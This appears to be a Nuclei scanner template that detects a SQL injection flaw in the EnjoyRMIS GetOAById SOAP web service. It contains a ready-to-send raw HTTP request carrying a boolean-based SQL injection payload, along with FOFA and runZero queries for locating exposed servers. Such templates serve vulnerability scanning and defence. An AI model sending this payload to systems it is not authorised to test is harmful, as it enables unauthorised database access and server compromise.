nuclei-v3/E/enjoyrmis-sqli.yaml

http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"qqqzq1qvkqq")
    - contains(header,"text/xml")
    - status_code == 500
    type: dsl
  raw:
  - "POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/GetOAById\"\n\n<?xml\
    \ version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetOAById xmlns=\"http://tempuri.org/\">\n      <sId>string'\
    \ AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT\
    \ (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113)))\
    \ AND 'OFyo'='OFyo</sId>\n    </GetOAById>\n  </soap:Body>\n</soap:Envelope>\n"
id: enjoyrmis-sqli
info:
  author: s4e-io
  classification:
    cwe-id:
    - CWE-89
  description: 'EnjoyRMIS GetOAById has a SQL injection vulnerability, through which
    an attacker can obtain sensitive database information and even control the server.

    '
  metadata:
    fofa-query: body="CheckSilverlightInstalled"
    max-request: 1
    runzero-match: service["http.body"] matches "(?i)CheckSilverlightInstalled"
    verified: true
  name: EnjoyRMIS - SQL Injection
  reference:
  - https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: enjoyrmis,sqli,vuln
